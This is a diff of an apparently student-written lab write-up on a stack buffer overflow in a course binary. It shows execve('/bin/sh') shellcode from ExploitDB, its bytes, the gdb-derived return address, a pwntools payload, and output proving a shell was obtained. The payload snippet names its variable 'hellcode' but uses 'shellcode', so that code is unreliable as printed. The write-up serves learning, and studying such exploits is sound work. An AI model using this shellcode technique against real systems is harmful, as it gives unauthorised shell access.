@@ -154,9 +154,7 @@ void change_name() {
 }
 ```
 
-## Debugging
-
-**TODO**
+## Debugging and Exploit
 
 ### Environment Setup
 
@@ -256,12 +254,118 @@ What is the name > Name changed.
 user(name='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcaE@' id=1094795585 gid=1094795585 home='AAAAAAAAAAAA\xcaE@' shell='/usr/bin/rbash')
 ```
 
-After executing the `whoami()` function the program still crasges because with our offset of `\x41` bytes we also overwrite the address of the previous stackframe. To avoid a program crash we need to write the address of the of the previous stackframe to the `$rbp` register. For this we need to find the offset of the `$rbp` register analogus to the `$rsp` register.
+After executing the `whoami()` function the program still crasges because with our offset of `\x41` bytes we also overwrite the address of the previous stackframe. After several hours the crash could not be avoided in a simple way and thus avoiding the crash was not tried any longer to not waste any more time on this.
 
-The offset of the `$rbp` register was 64 bytes. We also needed to get a valid value to store in `$rbp` for this a programm run without an overflow, i.e. payload of 'xyz', was used and the value of the register printed in gdb. The register contained the value `0x7fffffffd410`. 
+Still a succesful redirect of the execution flow is possible.
 
-With this information the payload was adjusted accordingly.
+### Change execution flow to get authenticated as priv. user
 
-```python
-payload = b'\x41' * 64 + p64(0x7fffffffd410) + p64(0x4045ca)
+**TODO**
+
+### Shellcode executionm
+
+To execute shellcode the code had to be injected into the buffer which can be overflown and then have the return address point to the beginning address of this buffer. 
+
+For this the shellcode needs to fit into the buffer which has a size of 50 bytes. A quick Google search gives us a suitable shellcode candidate found on [ExploitDB](https://www.exploit-db.com/exploits/46907).
+
+```Assembly
+global _start
+section .text
+_start:
+	xor rsi,rsi
+	push rsi
+	mov rdi,0x68732f2f6e69622f
+	push rdi
+	push rsp
+	pop rdi
+	push 59
+	pop rax
+	cdq
+	syscall
 ```
+
+This assembly code can than be translated into a series of bytes using the `nasm` command.
+
+```bash
+$ nasm -f elf64 shellcode.asm -o shellcode.o
+$ ld shellcode.o -o shellcode
+$ objdump -D shellcode
+
+shellcode:     Dateiformat elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 <_start>:
+  401000:       48 31 f6                xor    %rsi,%rsi
+  401003:       56                      push   %rsi
+  401004:       48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
+  40100b:       2f 73 68
+  40100e:       57                      push   %rdi
+  40100f:       54                      push   %rsp
+  401010:       5f                      pop    %rdi
+  401011:       6a 3b                   push   $0x3b
+  401013:       58                      pop    %rax
+  401014:       99                      cltd
+  401015:       0f 05                   syscall
+```
+
+In our `objdump` output we can see the byte sequence needed to be injected as shellcode.
+
+`\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05`
+
+The shellcode is 23 bytes long so it fit perfectly into the 50 byte buffer.
+To overflow the buffer and set the return address to that of the start address of the buffer we first started the program with a known payload, e.g. `b'\x41' * 50`, and look at the stack in gdb to identify the starting address. 
+
+```bash
+0x00007fffffffd2c0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	← $rsp
+0x00007fffffffd2c8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0x00007fffffffd2d0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0x00007fffffffd2d8│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAA"
+0x00007fffffffd2e0│+0x0020: "AAAAAAAAAAAAAAAAAA"
+0x00007fffffffd2e8│+0x0028: "AAAAAAAAAA"
+0x00007fffffffd2f0│+0x0030: 0x0000000000004141 ("AA"?)
+0x00007fffffffd2f8│+0x0038: 0x0000000000406df0  →  0x0000000000402800  →  <__do_global_dtors_aux+0000> endbr64 
+```
+We can see that the starting address of the buffer is `0x00007fffffffd2c0`. With this information the following payload was crafted:
+
+```Python
+hellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+payload = shellcode + b'\x90' * (72 - len(shellcode)) + p64(0x7fffffffd2c0)
+```
+First the shellcode is placed in the buffer, then the buffer is overflown using the `\x90` (nop) bytes up to the offset where we need to write the wanted return address, lastly the return address is written to the stack.
+
+When executed the payload delivers the following succesfull execution of a shell.
+
+```bash
+$ python3 attack.py
+[*] '/home/philip/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato2/potato'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+[+] Starting local process '/home/philip/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato2/potato': pid 313530
+[!] ASLR is disabled!
+[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/philip/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato2/potato', '313530', '-x', '/tmp/pwnqkme5pqz.gdb']
+[+] Waiting for debugger: Done
+b'starting up (pid 313530)\nreading file userlist\nhandle_client\ncmd> '
+b'Welcome!\nusername: password: searching for user ...\nchecking password ...\nYou are authorized.\n\ncmd> '
+[*] Switching to interactive mode
+What is the name > Name changed.
+$ $ whoami
+philip
+$ $ id philip
+uid=1000(philip) gid=1000(philip) groups=1000(philip),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),123(lxd),984(docker),128(libvirt)
+```
+We can clearly see that we are no longer bound to the executed program but rather have full shell access with the rights of the user `philip`. 
+
+#### Ret2libc attac
+
+**TODO**
+
+#### Custom shellcode or ROP chain
+
+**TODO**
